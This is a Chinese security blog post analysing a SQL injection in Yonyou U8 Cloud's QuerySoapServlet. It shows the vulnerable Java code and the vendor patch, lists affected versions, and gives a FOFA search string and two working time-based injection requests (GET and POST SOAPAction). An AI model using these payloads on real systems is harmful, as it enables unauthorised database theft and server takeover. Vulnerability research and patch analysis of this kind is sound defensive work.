---
title: "用友U8 Cloud QuerySoapServlet SQL注入漏洞"
source: https://mrxn.net/jswz/yonyou-u8cloud-QuerySoapServlet-sqli.html
asset_dir: assets/用友u8-cloud-querysoapservlet-sql注入漏洞
---

# 用友U8 Cloud QuerySoapServlet SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/1/9 08:10
* 1756浏览
* [0评论](#comment)
* 1小时阅读

深入探索

Cloud

软件

CRM


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B "用友")U8 [Cloud](#)是用友推出的云ERP，主要聚焦成长型、创新型企业，提供企业级云ERP整体解决方案。是基于全新的企业互联网理念设计的云ERP系统，它旨在为企业提供集人财物客产供销于一体的云ERP整体解决方案，推动企业敏经营、轻管理、简IT，助力企业实现高速发展与云化创新。用友U8 Cloud QuerySoapServlet 接口处存在SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")，未经身份验证的远程攻击者除了可以利用 [SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

云存储

# 影响版本

2.0,2.1,2.3,2.5,2.6,2.65,2.7,3.0,3.1,3.2,3.5,3.6,5.0,5.0sp

# 漏洞分析

```
public void service(ServletRequest request, ServletResponse response) throws ServletException, IOException {
        response.setContentType("text/xml;charset=gb2312");
        String queryId = null;
        String dsn = request.getParameter("dsn");
        String soapAction;
        if (!((HttpServletRequest)request).getMethod().equalsIgnoreCase("POST")) {
            queryId = request.getParameter("queryid");
            soapAction = "http://" + request.getServerName();
            if (request.getServerPort() != 80) {
                soapAction = soapAction + ":" + request.getServerPort();
            }

            soapAction = soapAction + "/servlet/nc.bs.pub.querymodel.soap.QuerySoapServlet?dsn=";
            soapAction = soapAction + dsn;
            sendWsdl(response, queryId, dsn, soapAction);
        } else {
            soapAction = ((HttpServletRequest)request).getHeader("SOAPAction");
            if (soapAction == null) {
                throw new ServletException(NCLangResOnserver.getInstance().getStrByID("10241201", "UPP10241201-001013"));
            } else {
                if (soapAction.startsWith("\"") || soapAction.startsWith("'")) {
                    soapAction = soapAction.substring(1, soapAction.length() - 1);
                }

                queryId = soapAction.substring("execQuery".length(), soapAction.length());
                sendSoapPart1(response);

                try {
                    InputStream is = request.getInputStream();
                    Document doc = XMLUtil.getDocumentBuilder().parse(is);
                    StringBuffer sb = new StringBuffer();
                    XMLUtil.writeXMLFormatString(sb, doc, 4);
                    Logger.debug(sb.toString());
                    NodeList nl = doc.getDocumentElement().getChildNodes();
                    Element body = null;

                    for(int i = 0; i < nl.getLength(); ++i) {
                        if (nl.item(i).getNodeType() == 1 && nl.item(i).getNodeType() == 1 && nl.item(i).getNodeName().endsWith("Body")) {
                            body = (Element)nl.item(i);
                            break;
                        }
                    }

                    if (body == null) {
                        throw new Exception(NCLangResOnserver.getInstance().getStrByID("10241201", "UPP10241201-001014"));
                    }

                    Element queryElement = null;
                    nl = body.getChildNodes();

                    for(int i = 0; i < nl.getLength(); ++i) {
                        if (nl.item(i).getNodeType() == 1) {
                            queryElement = (Element)nl.item(i);
                            break;
                        }
                    }

                    Hashtable h = new Hashtable();
                    if (queryElement != null) {
                        nl = queryElement.getChildNodes();

                        for(int i = 0; i < nl.getLength(); ++i) {
                            if (nl.item(i).getNodeType() == 1) {
                                String paraname = nl.item(i).getNodeName();
                                Node valueNode = nl.item(i).getFirstChild();
                                if (valueNode != null && valueNode.getNodeType() == 3) {
                                    ParamVO vo = new ParamVO();
                                    vo.setValue(valueNode.getNodeValue());
                                    h.put(paraname, vo);
                                }
                            }
                        }
                    }

                    DataSet set = ModelUtil.getQueryResult(queryId, h, dsn);
                    if (set == null) {
                        throw new Exception(NCLangResOnserver.getInstance().getStrByID("10241201", "UPP10241201-001015"));
                    }

                    sendDataSet(response, set, queryId);
                    Logger.debug(set.getRowCount());
                } catch (Exception var17) {
                    Logger.error(var17);
                    sendFault(response, var17);
                }

                sendSoapPart2(response);
            }
        }
```

如果不是 PSOT 请求，即 GET请求，会进入第一个处理逻辑，其中 `queryid` 会带入 `sendWsdl` 函数，否则进入 `POST` 请求处理逻辑，`queryid` 值来自请求头的 `SOAPAction` 的 `execQuery` 字符后到整个 `soapAction` 值的末尾部，然后带入 `getQueryResult` 函数进行执行。  
因此这里我们需要注意，有两种注入方式，网上基本都是使用的第一种GET方式。

SQL注入检测工具

再结合补丁对比 其中模块为 uapqe  
[[![用友U8 Cloud QuerySoapServlet SQL注入漏洞](images/img-001-eb8bdf2ece38.png)](https://mrxn.net/content/uploadfile/202501/fbba1736351160.png)](https://mrxn.net/content/uploadfile/202501/fbba1736351160.png)  
补丁内容如下

```
package nc.bs.pub.querymodel;

import java.sql.ResultSet;
import java.sql.SQLException;

import nc.bs.logging.Logger;
import nc.jdbc.framework.JdbcSession;
import nc.jdbc.framework.PersistenceManager;
import nc.jdbc.framework.SQLParameter;
import nc.jdbc.framework.exception.DbException;
import nc.jdbc.framework.processor.ResultSetProcessor;
import nc.vo.com.utils.DBObjectReader;
import nc.vo.pub.core.BizObject;
import nc.vo.pub.querymodel.FormatModelNode;
import nc.vo.pub.querymodel.QueryModelNode;
/**
 * 访问业务模型的DAO
 * 这里的业务模型暂时包括
 * 1.查询模型QueryModelDef
 * 2.格式设计模型FormatModelDef
 * 此类模型的特点是某字段是一个大对象(Blob)字段，其中序列化了模型对象
 * @author jl
 *
 */
        /**
         * 根据ID查询业务对象
         * @param id
         * @param kind
         * @param dsName
         * @return
         * @throws DbException
         */
        public BizObject getModelDefByID(String id, String kind, String dsName)
                        throws DbException {
                PersistenceManager sessionManager = null;
                String table = null;
                if (QueryModelNode.MODEL_KIND.equals(kind)) {
                        table = "pub_querymodeldef";
                } else if (FormatModelNode.FORMAT_KIND.equals(kind)) {
                        table = "pub_formatmodeldef";
                }
                // 构造SQL语句
//                String sql = "SELECT PROP from " + table + " WHERE ID = '" + id + "'";
                //防sql注入
                String sql = "SELECT PROP from " + table + " WHERE ID = ? ";
                SQLParameter sqlparam = new SQLParameter();
                sqlparam.addParam(id);
                BizObject bizObj = null;
                try {
                        if (dsName != null) {
                                sessionManager = PersistenceManager.getInstance(dsName);
                        } else {
                                sessionManager = PersistenceManager.getInstance();
                        }
                        JdbcSession session = sessionManager.getJdbcSession();
                        Object obj = session.executeQuery(sql, sqlparam,new ResultSetProcessor() {
                                public Object handleResultSet(ResultSet rs) throws SQLException {
                                        BizObject obj = null;
                                        if (rs.next()) {
                                                obj = (BizObject) DBObjectReader.readObject(rs, "prop");
                                        }
                                        return obj;
                                }
                        });
                        bizObj = (BizObject) obj;
                } finally {
                        if (sessionManager != null)
                                sessionManager.release();
                }
                return bizObj;
        }
}
```

官方已经给我们注释好了！直接拼接导致的[SQL注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL注入")漏洞。

# 漏洞复现

## FOFA

> `app="用友-U8-Cloud"`

## GET

```
GET /service/~uapqe/nc.bs.pub.querymodel.soap.QuerySoapServlet?dsn=1&queryid=1%27%3b%57%41%49%54%46%4f%52%10%44%45%4c%41%59%10%27%30%3a%30%3a%35%27-- HTTP/1.1
Host: mrxn.net
```

成功 延时 5 秒  
[[![用友U8 Cloud QuerySoapServlet SQL注入漏洞](images/img-002-eeef67687039.png)](https://mrxn.net/content/uploadfile/202501/5d6c1736351790.png)](https://mrxn.net/content/uploadfile/202501/5d6c1736351790.png)  
下面来复现 POST SOAP（其实没啥关系）方式

代码安全审计

## POST

```
POST /servlet/~uapqe/nc.bs.pub.querymodel.soap.QuerySoapServlet?dsn=1 HTTP/1.1
Host: mrxn.net
Content-Type: application/xml
SOAPAction: execQuery1'WAITFOR DELAY'0:0:5'--

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:s0="http://www.ufsoft.com/Nc">
  <soapenv:Header/>
  <soapenv:Body>
  </soapenv:Body>
</soapenv:Envelope>
```

也是成功延时 5 秒

[[![用友U8 Cloud QuerySoapServlet SQL注入漏洞](images/img-003-301f0a4337fe.png)](https://mrxn.net/content/uploadfile/202501/11941736352312.png)](https://mrxn.net/content/uploadfile/202501/11941736352312.png)

# 参考

* `https://security.yonyou.com/#/noticeInfo?id=499`
* `https://security.yonyou.com/#/patchInfo?identifier=63184e0cf1cb486f9bd223c4d70438bc`

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#Java](https://mrxn.net/tag/Java)
* [#用友](https://mrxn.net/tag/%E7%94%A8%E5%8F%8B)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.漏洞分析](#toc-3-)
* [4.漏洞复现](#toc-4-)
* [4.1.FOFA](#toc-4-1-)
* [4.2.GET](#toc-4-2-)
* [4.3.POST](#toc-4-3-)
* [5.参考](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[用友U8 Cloud QuerySoapServlet SQL注入漏洞](https://mrxn.net/jswz/yonyou-u8cloud-QuerySoapServlet-sqli.html)  
文章链接：<https://mrxn.net/jswz/yonyou-u8cloud-QuerySoapServlet-sqli.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

漏洞扫描服务

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/yonyou-u8cloud-QuerySoapServlet-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

企业资源规划

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

